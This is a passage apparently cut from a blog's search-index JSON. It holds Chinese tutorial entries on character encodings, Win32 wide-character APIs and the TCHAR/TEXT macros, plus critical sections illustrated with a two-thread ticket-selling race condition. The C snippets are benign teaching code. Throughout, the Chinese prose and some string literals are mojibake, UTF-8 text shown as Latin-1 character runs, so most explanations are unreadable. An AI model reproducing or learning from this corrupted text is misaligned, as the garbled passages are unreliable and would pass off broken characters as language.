å¤šå­—èŠ‚å­—ç¬¦ç³»ç»Ÿ)ã€‘ï¼Œå®ƒç”±ä¸€ä¸ªæˆ–ä¸¤ä¸ªå­—èŠ‚è¡¨ç¤ºä¸€ä¸ªå­—ç¬¦ï¼Œè¿™è¯´æ˜DBCSå¹¶ä¸ä¸€å®šæ˜¯ä¸¤ä¸ªå­—èŠ‚ã€‚å¯¹äºè‹±æ–‡å­—æ¯ï¼Œæ˜¯å‘ASCIIå…¼å®¹çš„ï¼Œä¾ç„¶ç”±1ä¸ªå­—èŠ‚è¡¨ç¤ºï¼›è€Œå¯¹äºä¸­æ–‡åˆ™ç”¨2ä¸ªå­—èŠ‚è¡¨ç¤ºã€‚è‹±æ–‡å’Œä¸­æ–‡å¯ä»¥ç»Ÿä¸€åœ°å¤„ç†ï¼ŒåŒºåˆ†å­—ç¬¦ä¸ºä¸­æ–‡çš„æ–¹æ³•æ˜¯çœ‹2ä¸ªå­—èŠ‚ä¸­çš„é«˜å­—èŠ‚çš„é¦–ä½æ˜¯å¦ä¸º1ã€‚GB2312ï¼ŒGBKåˆ°GB18030éƒ½å±äºDBCS Unicodeå­—ç¬¦é›†ï¼ˆå®½å­—ç¬¦é›†ï¼‰ï¼ŒANSIå­—ç¬¦é›†ç›¸å¯¹æ¯”Unicodeå­˜å‚¨è€—è´¹çš„å­—èŠ‚æ•°æ›´å°‘ï¼Œäºæ˜¯åˆç§°ä¸ºçª„å­—ç¬¦é›† 12345678910#include &lt;stdio.h&gt;int main()&#123; char szStr[] = &quot;Aä¸­&quot;; wchar_t swzStr[] = L&quot;Aä¸­&quot;; //wchar_tç±»å‹åœ¨stdio.hæ–‡ä»¶ä¸­ return 0;&#125; wchar_t swaStrçš„Momoryçª—å£æ³¨é‡Šç¼–è¯‘å™¨ä»ä»¥ASCIIç ä¸ºæ³¨é‡Šï¼Œæ‰€ä»¥æ˜¯ä¹±ç ã€‚ä»£ç ä¸­ç¨‹åºå‘˜çš„æ„å›¾æ˜¯ç”¨Unicodeæ¥å¯¹å­—ç¬¦&quot;Aä¸­&quot;è¿›è¡Œç¼–ç å­˜å‚¨ï¼ˆç”¨äº†Lï¼‰ å‡½æ•°å˜åŒ– ASCIIå­—ç¬¦é›†å’ŒUnicodeå­—ç¬¦é›†åœ¨å†…å­˜ä¸­çš„å­˜å‚¨æ–¹å¼ä¸ä¸€æ ·ï¼Œå­—ç¬¦å çš„å­—èŠ‚æ•°å˜äº†ï¼Œæ‰€ä»¥è¦ç”¨å¯¹åº”ç‰ˆæœ¬çš„å­—ç¬¦ä¸²å‡½æ•°ï¼Œå¦åˆ™ä¼šå‡ºé”™ã€‚çª„å­—ç¬¦è¦ç”¨çª„å­—ç¬¦çš„å‡½æ•°ç‰ˆæœ¬ï¼Œå®½å­—ç¬¦è¦ç”¨å®½å­—ç¬¦çš„å‡½æ•°ç‰ˆæœ¬ã€‚ å¤šå­—èŠ‚å­—ç¬¦ å®½å­—ç¬¦ char wchar_t printf wprintf æ‰“å°åˆ°æ§åˆ¶å°å‡½æ•° strlen wcslen è·å–é•¿åº¦ strcpy wcscpy å­—ç¬¦ä¸²å¤åˆ¶ strcat wcscat å­—ç¬¦ä¸²æ‹¼æ¥ strcmp wcscmp å­—ç¬¦ä¸²æ¯”è¾ƒ strstr wcsstr å­—ç¬¦ä¸²æŸ¥æ‰¾ æ‰“å°å®½å­—ç¬¦åˆ°æ§åˆ¶å° 1234567891011#include &lt;stdio.h&gt;#include &lt;locale.h&gt; //setlocaleint main()&#123; setlocale(LC_ALL, &quot;&quot;); wchar_t swzStr[] = L&quot;Aä¸­&quot;; // wchar_tç±»å‹åœ¨stdio.hæ–‡ä»¶ä¸­ wprintf(L&quot;%s &quot;, swzStr); return 0;&#125; è·å–å­—ç¬¦ä¸²é•¿åº¦ 123456789101112#include &lt;Windows.h&gt;int main()&#123; char szStr[] = &quot;China&quot;; // å 6ä¸ªå­—èŠ‚ï¼Œé•¿åº¦æ˜¯5 wchar_t swzStr[] = L&quot;China&quot;; // å 12ä¸ªå­—èŠ‚ï¼Œé•¿åº¦ä¹Ÿæ˜¯5ï¼Œå› ä¸ºå®½å­—ç¬¦ä¸¤å­—èŠ‚ç®—1ä¸ª int iLengthOfsz = strlen(szStr); // å–å¾—å¤šå­—èŠ‚å­—ç¬¦ä¸²ä¸­å­—ç¬¦é•¿åº¦ï¼Œä¸åŒ…å« 00 int iLengthOfswz = wcslen(swzStr); // å–å¾—å®½å­—èŠ‚å­—ç¬¦ä¸²ä¸­å­—ç¬¦é•¿åº¦ï¼Œä¸åŒ…å« 00 00 return 0;&#125;"},{"title":"Win32 APIä¸­çš„å®½å­—ç¬¦","path":"/wiki/Windows_API/Win32_APIä¸­çš„å®½å­—ç¬¦.html","content":"çŸ¥è¯†è¡¥å…… ä»€ä¹ˆæ˜¯Win32 APIï¼Ÿæœ‰å“ªäº›ï¼Ÿåœ¨å“ªé‡Œï¼Ÿ Win32 API(Application Programming Interface)ï¼Œæ˜¯Windowsæ“ä½œç³»ç»Ÿæä¾›ç»™æˆ‘ä»¬çš„å‡½æ•°ï¼ˆåº”ç”¨ç¼–ç¨‹æ¥å£ï¼‰ã€‚å®ƒä»¬æ˜¯å­˜æ”¾åœ¨ç³»ç»Ÿç›®å½•ä¸‹çš„ä¸€äº›dllã€‚ å¦‚æœæ˜¯32ä½ç³»ç»Ÿï¼Œä½äºC:\\Windows\\System32ä¸‹çš„dll å¦‚æœæ˜¯64ä½ç³»ç»Ÿï¼š 32ä½çš„dllå­˜æ”¾äºC:\\Windows\\SysWOW64 64ä½çš„dllå­˜æ”¾äºC:\\Windows\\System32 é‡è¦çš„DLLæ–‡ä»¶ï¼š Kernel32.dllï¼šæœ€æ ¸å¿ƒçš„åŠŸèƒ½æ¨¡å—ï¼Œä¾‹å¦‚å†…å­˜ç®¡ç†ã€è¿›ç¨‹çº¿ç¨‹ç›¸å…³çš„å‡½æ•°ç­‰ï¼› User32.dllï¼šWindowsç”¨æˆ·ç•Œé¢ç›¸å…³çš„åº”ç”¨ç¨‹åºæ¥å£ï¼Œä¾‹å¦‚åˆ›å»ºçª—å£ã€å‘é€ä¿¡æ¯ç­‰ï¼› GDI32.dllï¼šå…¨ç§°æ˜¯Graphical Device Interfaceï¼ˆå›¾å½¢è®¾å¤‡æ¥å£ï¼‰ï¼ŒåŒ…å«ç”¨äºç”»å›¾å’Œæ˜¾ç¤ºæ–‡æœ¬çš„å‡½æ•°ã€‚ å®é™…ä¸Šï¼ŒKernel32.dllã€User32.dllå’ŒGDI32.dllç­‰dllæ–‡ä»¶æ˜¯ç»™å¼€å‘è€…æä¾›ä¸€ä¸ªæ¥å£æ¥è°ƒç”¨çœŸæ­£çš„å†…æ ¸å‡½æ•°ï¼Œå®ƒä»¬æ˜¯ä¸€ä¸ªè¿‡æ¸¡ï¼Œä¸€ä¸ªæ¥å£è€Œå·²ã€‚çœŸæ­£çš„å‡½æ•°å®ç°åœ¨å†…æ ¸ä¸­ï¼Œå†…æ ¸å‡½æ•°é€šå¸¸ä»¥Ntæˆ–Zwå¼€å¤´ åœ¨Cè¯­è¨€ç¼–ç¨‹ä¸­ï¼ŒåŒ…å«Windows.hå¤´æ–‡ä»¶å³å¯ä½¿ç”¨è¿™äº›API win32ä¸­çš„æ•°æ®ç±»å‹ win32å°†æ±‡ç¼–ã€Cã€C++ä¸­å·²æœ‰çš„æ•°æ®ç±»å‹ç”¨#defineèµ·äº†åˆ«åï¼Œå¥½å¤„ï¼š ç»Ÿä¸€é£æ ¼ï¼Œå¢å¼ºä»£ç å¯è¯»æ€§ã€‚å› ä¸ºæ±‡ç¼–ã€Cã€C++çš„å¼€å‘äººå‘˜éƒ½å¯ä»¥è°ƒç”¨win32apiï¼Œè®©è¿™äº›æ•°æ®ç±»å‹ç»Ÿä¸€åå­—ï¼Œè®©å¤§å®¶çš„ä»£ç é£æ ¼æ›´ç»Ÿä¸€æ¸…æ™°ã€‚ æ–¹ä¾¿è·¨å¹³å°ç§»æ¤ã€‚å¦‚æœéœ€è¦å°†å·²æœ‰çš„ä»£ç ç§»æ¤åˆ°åˆ«çš„å¹³å°ï¼Œåªéœ€è¦ä¿®æ”¹#defineé‡å®šä¹‰é‚£è¡Œ åœ¨win32ä¸­ä½¿ç”¨å­—ç¬¦ä¸² TCHARå’ŒTEXTæ˜¯å®ï¼Œä¼šæ ¹æ®å½“å‰IDEé¡¹ç›®çš„å­—ç¬¦é›†æ›¿æ¢ä¸ºç›¸åº”å­—ç¬¦é›† 123#define TEXT(quote) __TEXT(quote) // r_winnt#define __TEXT(quote) L##quote // r_winnt 12345678910//// Neutral ANSI/UNICODE types and macros//#ifdef UNICODE // r_winnt#ifndef _TCHAR_DEFINEDtypedef WCHAR TCHAR, *PTCHAR;typedef WCHAR TBYTE , *PTBYTE ;#define _TCHAR_DEFINED#endif /* !_TCHAR_DEFINED */ å­—ç¬¦ç±»å‹12345678910#include &lt;Windows.h&gt;int main() &#123; CHAR szStr[] = &quot;ä¸­å›½&quot;; // ANSIå­—ç¬¦é›† WCHAR swzStr[] = L&quot;ä¸­å›½&quot;; // Unicodeå­—ç¬¦é›† TCHAR stzSr[] = TEXT(&quot;ä¸­å›½&quot;); //å¦‚æœé¡¹ç›®æ˜¯ASNIå­—ç¬¦é›†ï¼Œåˆ™æ›¿æ¢ä¸ºCHARç±»å‹ //å¦‚æœé¡¹ç›®æ˜¯Unicodeå­—ç¬¦é›†ï¼Œåˆ™æ›¿æ¢ä¸ºWCHARç±»å‹ return 0;&#125; PTSTRä¹Ÿæ˜¯å®ï¼Œä¹Ÿæ˜¯è‡ªé€‚åº” 123typedef LPWSTR PTSTR, LPTSTR;typedef _Null_terminated_ WCHAR *NWPSTR, *LPWSTR, *PWSTR; å­—ç¬¦ä¸²æŒ‡é’ˆ12345678910#include &lt;Windows.h&gt;int main() &#123; PSTR pszStr = &quot;ä¸­å›½&quot;; // char* PWSTR pwszStr = L&quot;ä¸­å›½&quot;; // wchar_t* PTSTR ptszStr = TEXT(&quot;ä¸­å›½&quot;); // PTSTR æ ¹æ®å½“å‰é¡¹ç›®ä½¿ç”¨çš„å­—ç¬¦é›†è‡ªåŠ¨æ¢æˆchar*æˆ–wchar_t* return 0;&#125; MessageBox win32apiéƒ½æœ‰ä¸¤ä¸ªç‰ˆæœ¬ï¼š ä¸€ä¸ªçª„å­—ç¬¦ç‰ˆæœ¬ï¼Œå‡½æ•°åä»¥Aç»“å°¾ ä¸€ä¸ªå®½å­—ç¬¦ç‰ˆæœ¬ï¼Œå‡½æ•°åä»¥Wç»“å°¾ ä»¥MessageBoxä¸ºä¾‹ï¼š 12345#ifdef UNICODE#define MessageBox MessageBoxW#else#define MessageBox MessageBoxA#endif // !UNICODE å¦‚æœä½¿ç”¨çª„å­—ç¬¦ï¼Œåº”è¯¥ä½¿ç”¨å‡½æ•°åä»¥Aç»“å°¾çš„ç‰ˆæœ¬ï¼›å¦‚æœä½¿ç”¨å®½å­—ç¬¦ï¼Œåº”è¯¥ä½¿ç”¨å‡½æ•°åä»¥Wç»“å°¾çš„ç‰ˆæœ¬ã€‚ å®é™…ä¸Šï¼Œwindowså†…æ ¸ä½¿ç”¨çš„éƒ½æ˜¯å®½å­—ç¬¦çš„ã€‚å¼€å‘è€…å¦‚æœä½¿ç”¨Aç‰ˆæœ¬çš„å‡½æ•°ï¼Œapiè°ƒç”¨åˆ°ç³»ç»Ÿå†…æ ¸æ—¶éœ€è¦å…ˆè½¬æ¢ä¸ºå®½å­—ç¬¦ç‰ˆæœ¬ï¼›è€Œå¦‚æœç›´æ¥ä½¿ç”¨Wç‰ˆæœ¬çš„å‡½æ•°ï¼Œå°±ä¸éœ€è¦è½¬æ¢ï¼Œæ€§èƒ½ä¼šå¥½ä¸€äº›ã€‚ 123456int MessageBox( [in, optional] HWND hWnd, [in, optional] LPCTSTR lpText, [in, optional] LPCTSTR lpCaption, [in] UINT uType); hWndï¼šè¡¨ç¤ºè¿™ä¸ªçª—å£å±äºè°ï¼Œè°ä¹Ÿä¸å±äºï¼Œå¡«NULL lpTextï¼šå¼¹å‡ºçª—å£æ˜¾ç¤ºçš„å†…å®¹ lpCaptionï¼šå¼¹å‡ºçª—å£çš„æ ‡é¢˜ uTypeï¼šå¼¹å‡ºçª—å£çš„ç±»å‹ Aç‰ˆæœ¬123CHAR strAsciiTitle[] = &quot;Title&quot;;CHAR strAsciiContent[] = &quot;Hello World!&quot;;MessageBoxA(0, strAsciiContent, strAsciiTitle, MB_OK); Wç‰ˆæœ¬123WCHAR strWideTitle[] = L&quot;Title&quot;;WCHAR strWideContent[] = L&quot;Hello World!&quot;;MessageBoxW(0, strWideContent, strWideTitle, MB_OK); å®å®šä¹‰ç‰ˆæœ¬123TCHAR strGenericTitle[] = TEXT(&quot;Title&quot;);TCHAR strGenericContent[] = TEXT(&quot;Hello World!&quot;);MessageBox(0, strGenericContent, strGenericTitle, MB_OK);"},{"title":"ä¸´ç•ŒåŒºï¼ˆCritical Sectionï¼‰","path":"/wiki/Windows_API/ä¸´ç•ŒåŒº.html","content":"å‰è¨€ æ¯ä¸ªçº¿ç¨‹éƒ½æœ‰è‡ªå·±çš„æ ˆï¼ˆå±€éƒ¨å˜é‡å­˜å‚¨çš„åœ°æ–¹ï¼‰ï¼Œè¿™äº›å±€éƒ¨å˜é‡æ˜¯çº¿ç¨‹è‡ªå·±ç‹¬æœ‰çš„ï¼Œå½±å“ä¸åˆ°åˆ«çš„çº¿ç¨‹ã€‚ä½†å…¨å±€å˜é‡æ˜¯æ‰€æœ‰çº¿ç¨‹éƒ½å¯ä»¥è®¿é—®åˆ°çš„ã€‚å¦‚æœå¤šä¸ªçº¿ç¨‹éƒ½è®¿é—®è‡ªå·±å †æ ˆä¸­çš„å±€éƒ¨å˜é‡ï¼Œä¸è®¿é—®å…¨å±€å˜é‡ï¼Œé‚£å°±æ²¡æœ‰çº¿ç¨‹å®‰å…¨çš„é—®é¢˜ï¼›å³ä½¿å¤šä¸ªçº¿ç¨‹è®¿é—®äº†å…¨å±€å˜é‡ï¼Œä½†éƒ½æ˜¯è¯»çš„æ“ä½œï¼Œæ²¡æœ‰å†™çš„æ“ä½œï¼Œä¹Ÿä¸å­˜åœ¨çº¿ç¨‹å®‰å…¨é—®é¢˜ã€‚åªæœ‰â€œå¤šä¸ªçº¿ç¨‹è®¿é—®åŒä¸€ä¸ªå…¨å±€å˜é‡ï¼Œå¹¶ä¸”æœ‰å†™çš„æ“ä½œâ€è¿™ç§æƒ…å†µä¸‹æ‰å­˜åœ¨å¤šçº¿ç¨‹å®‰å…¨é—®é¢˜ã€‚ ä¾‹ èµ·ä¸¤ä¸ªçº¿ç¨‹åŒæ—¶å–ç¥¨ï¼Œg_countNumberè¡¨ç¤ºç¥¨çš„æ€»æ•° 123456789101112131415161718192021222324252627282930313233343536#include &lt;windows.h&gt;#include &lt;stdio.h&gt;int g_countNumber = 10; //ç¥¨çš„æ€»æ•°DWORD WINAPI ThreadProc(LPVOID lpParameter) //å‚æ•°ç”¨æ¥æ ‡è®°æ˜¯å“ªä¸ªçº¿ç¨‹æ‰§è¡Œ&#123; int threadId = *(int*)lpParameter; while (g_countNumber &gt; 0) &#123; printf(&quot;Thread ID: %d, Tickets before selling: %d &quot;, threadId, g_countNumber); // å”®å–å‰å‰©å¤šå°‘å¼ ç¥¨ g_countNumber--; // ç¥¨æ€»æ•°å‡1 printf(&quot;Thread ID: %d, Tickets after selling: %d &quot;, threadId, g_countNumber); // å”®å–åå‰©å¤šå°‘å¼ ç¥¨ &#125; return 0;&#125;int main(int argc, char* argv[])&#123; HANDLE hThread; int threadId1 = 1; hThread = CreateThread(NULL, NULL, ThreadProc, &amp;threadId1, 0, NULL); HANDLE hThread1; int threadId2 = 2; hThread1 = CreateThread(NULL, NULL, ThreadProc, &amp;threadId2, 0, NULL); WaitForSingleObject(hThread, INFINITE); WaitForSingleObject(hThread1, INFINITE); CloseHandle(hThread); CloseHandle(hThread1); getchar(); return 0;&#125; æ‰§è¡Œåå‘ç°ç¥¨å–åˆ°äº†-1å¼ ã€‚ å› ä¸ºçº¿ç¨‹çš„åˆ‡æ¢æ˜¯éšæœºçš„ã€‚å‡è®¾å‰©æœ€å1å¼ ç¥¨ï¼ˆg_countNumber = 1ï¼‰ã€‚1å·çº¿ç¨‹åˆ¤æ–­g_countNumber &gt; 0è¿›å…¥whileå¾ªç¯ä½“ï¼Œæ­¤æ—¶å¯èƒ½å‘ç”Ÿäº†çº¿ç¨‹çš„åˆ‡æ¢ï¼Œåˆ‡åˆ°2å·çº¿ç¨‹æ‰§è¡Œï¼Œ2å·çº¿ç¨‹ä¹Ÿæ‰§è¡Œäº†åˆ¤æ–­ï¼Œå¹¶ä¸”å–å‡ºäº†ç¥¨ï¼Œå¹¶è®©ç¥¨æ•°å‡1ï¼Œæ­¤æ—¶g_countNumber = 0ã€‚ç„¶åå›åˆ°1å·çº¿ç¨‹ï¼Œç»§ç»­å–ç¥¨ï¼Œå‡ç¥¨ï¼Œè¿™å°±è®©g_countNumberå‡åˆ°è´Ÿæ•°äº†ã€‚ ä¸´ç•ŒåŒº åœ¨è§£å†³ä¸Šè¿°é—®é¢˜å‰ï¼Œå¼•å…¥ä¸¤ä¸ªæ¦‚å¿µï¼š ä¸´ç•Œèµ„æºï¼šä¸€æ¬¡åªå…è®¸ä¸€ä¸ªçº¿ç¨‹ä½¿ç”¨çš„èµ„æº ä¸´ç•ŒåŒºï¼šè®¿é—®ä¸´ç•Œèµ„æºçš„é‚£éƒ¨åˆ†ä»£ç  æˆ‘ä»¬å¯ä»¥é€šè¿‡è¿™æ ·çš„æ–¹å¼æ¥æ§åˆ¶ä¸´ç•ŒåŒºçš„è®¿é—®ï¼šåªæœ‰æ‹¿åˆ°äº†ä»¤ç‰Œçš„çº¿ç¨‹æ‰èƒ½è®¿é—®å…¨å±€å˜é‡Xã€‚é‚£ä¹ˆå¯èƒ½å‘ç”Ÿçš„åœºæ™¯å¦‚ä¸‹ï¼šå‡è®¾çº¿ç¨‹1æ‹¿äº†è¿™å—ä»¤ç‰Œã€‚å¦‚æœæ­¤æ—¶å‘ç”Ÿåˆ‡æ¢ï¼Œåˆ‡åˆ°çº¿ç¨‹2ï¼Œçº¿ç¨‹2åˆ¤æ–­ä»¤ç‰Œæ˜¯å¦è¢«æ‹¿èµ°ï¼Œæ˜¯ï¼Œé‚£ä¹ˆçº¿ç¨‹2æ²¡æ³•ç»§ç»­æ‰§è¡Œã€‚ç›´åˆ°çº¿ç¨‹1å½’è¿˜äº†ä»¤ç‰Œï¼Œå…¶ä»–çº¿ç¨‹æ‰èƒ½æ‹¿è¿™å—ä»¤ç‰Œï¼Œæ‰èƒ½è®¿é—®å…¨å±€å˜é‡Xã€‚ï¼ˆä»¤ç‰Œåœ¨è¿™é‡Œå°±æ˜¯ä¸€å—å†…å­˜ï¼Œ0è¡¨ç¤ºæœ‰äººæ‹¿èµ°äº†ï¼Œç›®å‰ä»¤ç‰Œè¢«å ç”¨ï¼Œ1è¡¨ç¤ºç›®å‰ä»¤ç‰Œå¯ç”¨ï¼‰ã€‚ è‡ªå·±å®ç°ä»¤ç‰Œçš„å®ç°è¿˜éœ€è¦è€ƒè™‘ä¸€äº›ç»†èŠ‚ï¼Œæ¯”å¦‚å½“çº¿ç¨‹1åˆ¤æ–­ä»¤ç‰Œæ˜¯å¦è¿˜åœ¨æ—¶ï¼Œè¿˜åœ¨ï¼Œç»“æœåˆ‡åˆ°çº¿ç¨‹2ï¼Œçº¿ç¨‹2ä¹Ÿåˆ¤æ–­ä»¤ç‰Œè¿˜åœ¨ï¼Œå¯èƒ½å‡ºç°ä¸¤ä¸ªçº¿ç¨‹éƒ½æ‹¿äº†ä»¤ç‰Œã€‚ï¼ˆå…¶å®è®©åˆ¤æ–­ä»¤ç‰Œå’Œæ‹¿ä»¤ç‰Œçš„æ“ä½œæ˜¯åŸå­æ“ä½œå³å¯ï¼‰ã€‚åœ¨è¿™é‡Œæˆ‘ä»¬ç›´æ¥windowsæä¾›çš„apiï¼Œåœ¨å½“å‰é˜¶æ®µçŸ¥é“è¿™ä¸ªapiæ˜¯å®‰å…¨çš„ï¼Œé˜²æ­¢äº†ä¸Šè¿°æƒ…å†µçš„å‘ç”Ÿå°±å¤Ÿäº†ã€‚ ä¸´ç•ŒåŒºé” ä¸´ç•ŒåŒºé”æ˜¯æ§åˆ¶ä¸´ç•ŒåŒºçš„ä¸€ç§æ–¹å¼ã€‚ åˆ›å»ºå…¨å±€å˜é‡ï¼šCRITICAL_SECTION cs; åˆå§‹åŒ–å…¨å±€å˜é‡ï¼šInitializeCriticalSection(&amp;cs); å®ç°ä¸´ç•ŒåŒº 123EnterCriticalSection(&amp;cs); //è¿›å…¥ä¸´ç•ŒåŒº//ä½¿ç”¨ä¸´ç•Œèµ„æºLeaveCriticalSection(&amp;cs); //ç¦»å¼€ä¸´ç•ŒåŒº ç›¸å…³å‡½æ•°1234567891011// åˆå§‹åŒ–ä¸´ç•ŒåŒºå¯¹è±¡èµ„æºvoid InitializeCriticalSection(LPCRITICAL_SECTION lpCriticalSection); // è¿›å…¥ä¸´ç•ŒåŒºvoid EnterCriticalSection(LPCRITICAL_SECTION lpCriticalSection); // ç¦»å¼€ä¸´ç•ŒåŒºvoid LeaveCriticalSection(LPCRITICAL_SECTION lpCriticalSection); // åˆ é™¤ä¸´ç•ŒåŒºå¯¹è±¡èµ„æºvoid DeleteCriticalSection(LPCRITICAL_SECTION lpCriticalSection); ç”¨çº¿ç¨‹é”è§£å†³ä¸Šé¢å–ç¥¨çš„é—®é¢˜ï¼Œåœ¨ä¸´ç•ŒåŒºå‰ååŠ Enterå’ŒLeaveä¸´ç•ŒåŒºã€‚ 12345678910111213141516171819202122232425262728293031323334353637383940414243#include &lt;windows.h&gt;#include &lt;stdio.h&gt;int g_countNumber = 10;+ CRITICAL_SECTION cs;DWORD WINAPI ThreadProc(LPVOID lpParameter) //å‚æ•°ç”¨æ¥æ ‡è®°å“ªä¸ªçº¿ç¨‹æ‰§è¡Œ&#123; int threadId = *(int*)lpParameter; while (g_countNumber &gt; 0) &#123;+ EnterCriticalSection(&amp;cs); //è¿›å…¥ä¸´ç•ŒåŒº printf(&quot;Thread ID: %d, Tickets before selling: %d &quot;, threadId, g_countNumber); // å”®å–å‰å‰©å¤šå°‘å¼ ç¥¨ g_countNumber--; // ç¥¨æ€»æ•°å‡1 printf(&quot;Thread ID: %d, Tickets after selling: %d &quot;, threadId, g_countNumber); // å”®å–åå‰©å¤šå°‘å¼ ç¥¨+ LeaveCriticalSection(&amp;cs); //ç¦»å¼€ä¸´ç•ŒåŒº &#125; return 0;&#125;int main(int argc, char* argv[])&#123;+ InitializeCriticalSection(&amp;cs); //åˆå§‹åŒ–ä¸´ç•ŒåŒºèµ„æº HANDLE hThread; int threadId1 = 1; hThread = CreateThread(NULL, NULL, ThreadProc, &amp;threadId1, 0, NULL); HANDLE hThread1; int threadId2 = 2; hThread1 = CreateThread(NULL, NULL, ThreadProc, &amp;threadId2, 0, NULL); WaitForSingleObject(hThread, INFINITE); WaitForSingleObject(hThread1, INFINITE); CloseHandle(hThread); CloseHandle(hThread1);+ DeleteCriticalSection(&amp;cs); //åˆ é™¤ä¸´ç•ŒåŒºèµ„æº getchar(); return 0;&#125; ä½†ä¿®æ”¹åçš„è¿™æ®µä»£ç å®é™…ä¸Šè¿˜å­˜åœ¨çº¿ç¨‹å®‰å…¨é—®é¢˜ã€‚å› ä¸ºæ£€æŸ¥g_countNumberçš„ä»£ç ä¸åœ¨ä¸´ç•ŒåŒºä¸­ã€‚å…·ä½“æ¥çœ‹ï¼Œé—®é¢˜å‡ºç°åœ¨è¿™æ ·ä¸€ä¸ªåœºæ™¯ä¸­ï¼š å‡è®¾g_countNumberå½“å‰ä¸º1ã€‚ çº¿ç¨‹1é€šè¿‡g_countNumber &gt; 0çš„æ£€æŸ¥ã€‚ çº¿ç¨‹1è¿›å…¥ä¸´ç•ŒåŒºä¹‹å‰ï¼Œå®ƒçš„æ—¶é—´ç‰‡ç”¨å®Œäº†ï¼Œåˆ‡åˆ°çº¿ç¨‹2ã€‚ çº¿ç¨‹2åŒæ ·é€šè¿‡g_countNumber &gt; 0çš„æ£€æŸ¥ï¼Œç„¶åè¿›å…¥ä¸´ç•ŒåŒºï¼Œå‡å°‘g_countNumberï¼Œæ­¤æ—¶g_countNumberå˜ä¸º0ï¼Œé€€å‡ºä¸´ç•ŒåŒºã€‚çº¿ç¨‹2ç»“æŸï¼Œåˆ‡åˆ°çº¿ç¨‹1 çº¿ç¨‹1å†æ¬¡è·å¾—æ‰§è¡Œï¼Œè¿›å…¥ä¸´ç•ŒåŒºï¼Œå‡å°‘g_countNumberï¼Œæ­¤æ—¶g_countNumberå˜ä¸º-1ã€‚ æ‰€ä»¥å¦‚æœæƒ³ç¡®ä¿çº¿ç¨‹å®‰å…¨ï¼Œéœ€è¦æŠŠå¯¹å…¨å±€å˜é‡æ‰€æœ‰çš„åˆ¤æ–­ï¼Œè¯»å†™éƒ½æ”¾åœ¨ä¸´ç•ŒåŒºé‡Œã€‚ å†æ¬¡ä¿®æ”¹ä»£ç ï¼š å°†å¯¹g_countNumberçš„æ£€æŸ¥ä¹Ÿæ”¾å…¥ä¸´ç•ŒåŒºä¸­12345678910111213141516171819DWORD WINAPI ThreadProc(LPVOID lpParameter)&#123; int threadId = *(int*)lpParameter; while (TRUE) // ä¿®æ”¹ä¸ºæ— é™å¾ªç¯ &#123; EnterCriticalSection(&amp;cs); //è¿›å…¥ä¸´ç•ŒåŒº if (g_countNumber &lt;= 0) &#123; // æ£€æŸ¥æ˜¯å¦è¿˜æœ‰ç¥¨ LeaveCriticalSection(&amp;cs); // æ²¡æœ‰ç¥¨äº†ï¼Œç¦»å¼€ä¸´ç•ŒåŒºï¼Œå½’è¿˜ä»¤ç‰Œ break; // é€€å‡ºå¾ªç¯ &#125; //è¿˜æœ‰ç¥¨ï¼Œå–ç¥¨ printf(&quot;Thread ID: %d, Tickets before selling: %d &quot;, threadId, g_countNumber); g_countNumber--; printf(&quot;Thread ID: %d, Tickets after selling: %d &quot;, threadId, g_countNumber); LeaveCriticalSection(&amp;cs); //ç¦»å¼€ä¸´ç•ŒåŒº &#125; return 0;&#125; å¦ä¸€ç§æ”¹æ³•å¯¹ä¸´ç•Œèµ„æºçš„æ£€æŸ¥ï¼ˆg_countNumber &gt; 0ï¼‰ä¹ŸåŒ…æ‹¬è¿›ä¸´ç•ŒåŒºã€‚1234567891011121314DWORD WINAPI ThreadProc(LPVOID lpParameter) //å‚æ•°ç”¨æ¥æ ‡è®°å“ªä¸ªçº¿ç¨‹æ‰§è¡Œ&#123; int threadId = *(int*)lpParameter; EnterCriticalSection(&amp;cs); //è¿›å…¥ä¸´ç•ŒåŒº while (g_countNumber &gt; 0) &#123; printf(&quot;Thread ID: %d, Tickets before selling: %d &quot;, threadId, g_countNumber); // å”®å–å‰å‰©å¤šå°‘å¼ ç¥¨ g_countNumber--; // ç¥¨æ€»æ•°å‡1 printf(&quot;Thread ID: %d, Tickets after selling: %d &quot;, threadId, g_countNumber); // å”®å–åå‰©å¤šå°‘å¼ ç¥¨ &#125; LeaveCriticalSection(&amp;cs); //ç¦»å¼€ä¸´ç•ŒåŒº return 0;&#125;è¿™ç§æ–¹å¼ä¹Ÿåšå¥½äº†ä¸´ç•Œèµ„æºçš„äº’æ–¥æ§åˆ¶ã€‚ä½†æœ‰ä¸€ä¸ªé—®é¢˜ï¼Œå› ä¸ºè¿›å…¥ä¸´ç•ŒåŒºå’Œç¦»å¼€ä¸´ç•ŒåŒºå‡ ä¹åŒ…ä½äº†æ•´ä¸ªçº¿ç¨‹å‡½æ•°ï¼Œå¯¼è‡´æ— æ³•å‘æŒ¥å¤šçº¿ç¨‹çš„ä¼˜åŠ¿ã€‚è™½ç„¶ä»æ„Ÿè§‰ä¸Šç¨‹åºæ•ˆç‡ä¹Ÿæ²¡æ¯”ä¸Šé¢ç”¨while(TRUE)é«˜å¤šå°‘ã€‚è¿™å¯èƒ½æ˜¯å› ä¸ºåœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼Œçº¿ç¨‹å‡½æ•°çš„ä»£ç æ¯”è¾ƒå°‘ï¼Œæ‰€ä»¥ä½“ç°ä¸å‡ºä¼˜åŠ¿ã€‚ä½†ä»£ç é‡è¾ƒå¤šæ—¶ï¼Œå·®å¼‚å°±ä¼šä½“ç°å‡ºæ¥ã€‚ CRITICAL_SECTIONç»“æ„ä½“æˆå‘˜ è°ƒåº¦ç¨‹åºå°±æ˜¯æ ¹æ®è¿™ä¸ªç»“æ„ä½“ä¸­æˆå‘˜çš„å€¼æ¥çŸ¥é“ä¸´ç•ŒåŒºçš„ä½¿ç”¨æƒ…å†µ 12345678typedef struct _RTL_CRITICAL_SECTION &#123; PRTL_CRITICAL_SECTION_DEBUG DebugInfo; LONG LockCount; //é”è®¡æ•°ï¼ˆæˆ–é”å®šè®¡æ•°ï¼‰ LONG RecursionCount; //é€’å½’è®¡æ•° HANDLE OwningThread; //çº¿ç¨‹IDï¼Œè¡¨ç¤ºæŒæœ‰ä¸´ç•ŒåŒºçš„çº¿ç¨‹ HANDLE LockSemaphore; DWORD SpinCount;&#125; RTL_CRITICAL_SECTION, *PRTL_CRITICAL_SECTION; LockCountï¼šè¡¨ç¤ºä¸´ç•ŒåŒºæ˜¯å¦è¢«å ç”¨ 